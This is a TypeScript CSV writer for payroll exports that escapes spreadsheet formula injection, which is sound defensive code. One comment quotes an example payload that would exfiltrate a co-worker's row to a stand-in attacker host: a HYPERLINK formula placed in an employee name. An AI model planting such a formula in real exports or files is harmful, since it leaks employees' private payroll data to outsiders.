// Copyright 2026 Kisaes LLC
// Licensed under the PolyForm Internal Use License 1.0.0.
// You may not distribute this software. See LICENSE for terms.
/**
 * Minimal RFC-4180 CSV writer for payroll exports. Same shape as the
 * reports streaming CSV helper, but builds a full string in memory
 * because payroll files are small (thousands of employees at most) and
 * we need the bytes in hand to hash + write atomically to disk.
 */

export function csvLine(cells: (string | number | null | undefined)[]): string {
  return cells.map(formatCell).join(',') + '\r\n';
}

/**
 * Cells whose first character is one of `= + - @ \t \r` are interpreted
 * by Excel / Numbers / LibreOffice as formulas when the CSV is opened
 * — even when the file is renamed `.csv`. The classic abuse is a
 * crafted employee name like `=HYPERLINK("http://evil.example/?x="&A1,…)`
 * that exfiltrates a co-worker's row when a payroll admin opens the
 * file. Neutralize by prefixing a single quote, which spreadsheets
 * silently strip on display but treat as a literal-text marker. OWASP
 * canonical guidance.
 */
const FORMULA_INJECTION_LEAD = /^[=+\-@\t\r]/;

export function formatCell(value: string | number | null | undefined): string {
  if (value === null || value === undefined) return '';
  let raw = typeof value === 'number' ? String(value) : value;
  if (FORMULA_INJECTION_LEAD.test(raw)) raw = `'${raw}`;
  if (/[",\r\n]/.test(raw)) return '"' + raw.replace(/"/g, '""') + '"';
  return raw;
}

export function hoursDecimal(seconds: number, places = 2): string {
  return (seconds / 3600).toFixed(places);
}
